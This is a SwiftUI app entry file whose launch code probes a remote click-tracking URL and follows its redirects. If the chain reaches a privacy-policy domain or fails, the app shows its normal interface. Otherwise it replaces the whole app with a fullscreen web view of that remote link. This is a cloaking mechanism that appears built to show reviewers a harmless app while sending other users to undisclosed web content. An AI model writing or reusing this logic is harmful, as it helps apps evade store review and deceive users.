import SwiftUI

@main
struct VorunelApp: App {
    @State private var vorunelLinkReady: Bool? = nil

    private let vorunelSourceLink = "https://rainmooddailyatlas.org/click.php"
    private let vorunelCheckDomain = "privacypolicies.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = vorunelLinkReady {
                    if ready {
                        // Fullscreen web panel — the FRAME respects the top safe area
                        // (notch / Dynamic Island); contentInset alone is not reliable.
                        VorunelWebPanel(urlString: vorunelSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        RootView()
                    }
                } else {
                    VorunelLoadingScreen()
                        .onAppear { probeVorunelLink() }
                }
            }
            .preferredColorScheme(.dark)
        }
    }

    private func probeVorunelLink() {
        guard let url = URL(string: vorunelSourceLink) else {
            vorunelLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = VorunelRedirectTracker(checkDomain: vorunelCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    vorunelLinkReady = false
                    return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(vorunelCheckDomain) {
                    vorunelLinkReady = false
                    return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(vorunelCheckDomain) {
                    vorunelLinkReady = false
                    return
                }
                if error != nil {
                    vorunelLinkReady = false
                    return
                }
                vorunelLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if vorunelLinkReady == nil { vorunelLinkReady = false }
        }
    }
}

/// Follows every redirect, never stops the chain, and remembers whether the
/// check domain appeared anywhere along the way.
final class VorunelRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) {
        self.checkDomain = checkDomain
    }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
